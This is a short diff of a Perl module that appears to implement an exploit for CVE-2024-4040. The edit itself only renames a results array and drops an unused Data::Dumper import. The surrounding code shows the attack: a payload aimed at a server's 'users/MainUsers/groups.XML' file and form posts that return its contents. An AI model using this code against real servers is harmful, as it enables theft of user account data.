@@ -6,7 +6,7 @@ package Spellbook::Advisory::CVE_2024_4040 {
 
     sub new {
         my ($self, $parameters) = @_;
-        my ($target, $help, @results);
+        my ($target, $help, @result);
         my $payload = "users/MainUsers/groups.XML";
 
         Getopt::Long::GetOptionsFromArray (
@@ -36,12 +36,10 @@ package Spellbook::Advisory::CVE_2024_4040 {
                 $userAgent -> post($endpoint => form => $data);
                 $response = $userAgent -> post($endpoint => form => $data);
 
-                use Data::Dumper;
-
-                push @results, $response -> content();
+                push @result, $response -> content();
             }
 
-            return @results;
+            return @result;
         }
 
         if ($help) {
